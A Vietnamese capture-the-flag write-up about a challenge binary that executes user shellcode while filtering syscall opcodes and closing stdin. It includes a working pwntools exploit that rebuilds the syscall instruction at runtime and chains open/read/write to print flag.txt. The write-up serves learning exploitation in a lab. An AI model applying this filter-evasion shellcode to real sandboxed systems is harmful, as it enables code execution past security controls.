# Phân tích code 

<img width="954" height="522" alt="image" src="https://github.com/user-attachments/assets/e83a9614-4452-4407-adef-bbb354c1700b" />

### Lỗ hổng
Chương trình cho phép chúng ta nhập shellcode và thực thi ở cuối chương trình. Tuy nhiên, shellcode đã nhập trước khi thực thi sẽ được kiểm duyệt để kiểm tra xem có 2 BYTES nào bằng các giá trị `0x50F` `0x340F` `0x80CD`.

<img width="660" height="220" alt="image" src="https://github.com/user-attachments/assets/c621a938-5553-4d89-ac46-cb7586402e86" />

Các BYTES trên tương ứng với syscall và các biến thể của nó.

### Mitigation
<img width="817" height="333" alt="image" src="https://github.com/user-attachments/assets/5223086f-ac0b-484c-bd23-5802f1d00cb2" />

Vì không có khả năng leak địa chỉ nên không thể khai thác theo các kĩ thuật khác ngoài ret2shellcode.

- Với bài này thì ta gọi `execve('/bin/sh')` xong cũng không thể tương tác với shell. Vì trong chương trình còn có lệnh `close(0)` làm đóng file descriptor 0 (stdin) từ đó chặn mọi input đến từ người dùng. Cần gọi `open` `read` `write`.

- Trước tiên cần tìm giải pháp để bypass kiểm duyệt của chương trình. Ý tưởng ở đây là đẩy 0x50f-1 vào một địa chỉ lưu trữ nào đó. Sau đó cộng lại 1 vào địa chỉ đó để khôi phục syscall. Cuối cùng gọi call vào địa chỉ chứa syscall.


VD: Gọi open qua syscall đặt trong địa chỉ ở r10

    mov QWORD PTR [rsp-0x50], 0x50f-1  //đưa syscall fake vào
    inc BYTE PTR [rsp-0x50]            //khôi phục syscall
    lea r10, [rsp-0x50]                //lưu vào r10

    xor rdi, rdi                       //NULL
	push rdi
	mov rdi, 8392585648256674918       //flag.txt
	push rdi
    
    mov rax, 2
  	mov rdi, rsp
  	xor rsi, rsi
  	xor rdx, rdx
  	call r10                            //gọi syscall

Tuy nhiên shellcode này chỉ hoạt động khi gọi 1 syscall duy nhất. Vì khi call r10 thì rip đã hoàn toàn chuyển hướng qua chỗ khác.
Để quay lại shellcode chạy tiếp thì ta cần lưu lại trạng thái thanh ghi rip và khôi phục sau khi gọi syscall.

<img width="782" height="742" alt="Screenshot 2026-11-13 230005" src="https://github.com/user-attachments/assets/98df0bba-cc10-463f-b44f-ad7ade78fcb5" />

Đầu tiên cần lưu lại rip (vào rbp) sau đó cộng thêm offset đến câu  lệnh tiếp theo trong shellcode. Sau đó đẩy thêm các BYTES asm của lệnh `jmp rbp` vào sau lệnh syscall để khi gọi xong chương trình sẽ nhảy về shellcode.

VD: Gọi open rồi nhảy đến lệnh tiếp theo:

    mov QWORD PTR [rsp-0x50], 0x50f-1
    inc BYTE PTR [rsp-0x50]
    lea r10, [rsp-0x50]
    mov WORD PTR [r10+2], 0xe5ff      //jmp rbp
        
    xor rdi, rdi
    push rdi
    mov rdi, 8392585648256674918
    push rdi
    
    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    lea rbp, [rip+3]     //lưu địa chỉ câu lệnh sau vào rbp
    call r10
    ...

Bây giờ lặp lại cấu trúc này với các lần syscall sau để hoàn thành chuỗi `open` `read` `write` để in flag.

## Script python

    #!/usr/bin/env python3
    from pwn import *
    exe=ELF('vuln_patched',checksec=False)
    context.binary=exe
    p=process(exe.path)
    
    payload=asm(
    	'''
        mov QWORD PTR [rsp-0x50], 0x50f-1
        inc BYTE PTR [rsp-0x50]
        lea r10, [rsp-0x50]
        mov WORD PTR [r10+2], 0xe5ff
        
        xor rdi, rdi
    	push rdi
    	mov rdi, 8392585648256674918
    	push rdi
    
    	mov rax, 2
    	mov rdi, rsp
    	xor rsi, rsi
    	xor rdx, rdx
        lea rbp, [rip+3]
    	call r10
    
    	mov rdi, rax
    	mov rax, 0
    	mov rsi, rsp
    	mov rdx, 0x100
        lea rbp, [rip+3]
    	call r10
    
    	mov rax, 1
    	mov rdi, 1
    	mov rsi, rsp
    	mov rdx, 0x100
        lea rbp, [rip+3]
    	call r10
    	''', arch='amd64')
    
    p.sendafter(b'shellcode:',payload)
    
    p.interactive()
